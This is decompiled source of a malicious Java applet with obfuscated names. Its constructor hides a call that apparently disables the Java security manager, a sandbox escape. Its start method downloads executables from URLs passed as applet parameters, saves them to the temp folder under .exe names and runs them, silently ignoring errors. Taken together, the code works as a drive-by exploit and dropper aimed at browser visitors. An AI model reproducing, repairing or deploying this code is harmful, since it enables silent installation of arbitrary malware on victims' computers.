import java.net.URL;
import java.awt.Component;
import java.util.Set;
import java.util.HashMap;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.util.HashSet;
import javax.swing.JList;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class asa extends Applet
{
    public JList yutyrs;
    
    public HashSet y5rfcxs() {
        return new HashSet();
    }
    
    @Override
    public void start() {
        super.start();
        try {
            final String[] split = this.getParameter("url").split("!##");
            String s = System.getProperty("java.io.tmpdir");
            if (s.charAt(s.length() - 1) != '\\') {
                s += "\\";
            }
            Integer n;
            Integer n2;
            Integer n3;
            for (n = 0; n < split.length && split[n].length() != 0; ++n, n3 = n2) {
                final String string = s + "ms" + n + ("dsasm.ex".substring(5) + "e");
                final InputStream kay = this.kay(split[n]);
                final FileOutputStream bra = this.bra(string);
                final byte[] array = new byte[1024];
                int read;
                while ((read = kay.read(array, 0, array.length)) != -1) {
                    bra.write(array, 0, read);
                }
                kay.close();
                bra.close();
                new yum().main(string);
                n2 = n;
            }
            this.kay(split[n - 1] + "").close();
        }
        catch (Exception ex) {}
    }
    
    public asa() {
        final fftubny fftubny = new fftubny(System.class, new StringBuffer("fg6").append("set").append("5ZSecu".substring(2)).append("rity".concat("3134OM".substring(5))).append("lKana".substring(2).concat("ger")).substring(3), new Object[1]);
        final HashSet y5rfcxs = this.y5rfcxs();
        y5rfcxs.add(fftubny);
        this.add(this.yutyrs = new JList(new Object[] { new HashMap() {
                @Override
                public Set entrySet() {
                    return y5rfcxs;
                }
            } }));
    }
    
    public FileOutputStream bra(final String s) {
        try {
            return new FileOutputStream(s);
        }
        catch (Exception ex) {
            return null;
        }
    }
    
    public InputStream kay(final String s) {
        try {
            final URL url = new URL(s);
            url.openConnection();
            return (InputStream)Class.forName("java.net.URL").getMethod("openStream", (Class<?>[])new Class[0]).invoke(url, new Object[0]);
        }
        catch (Exception ex) {
            return null;
        }
    }
}
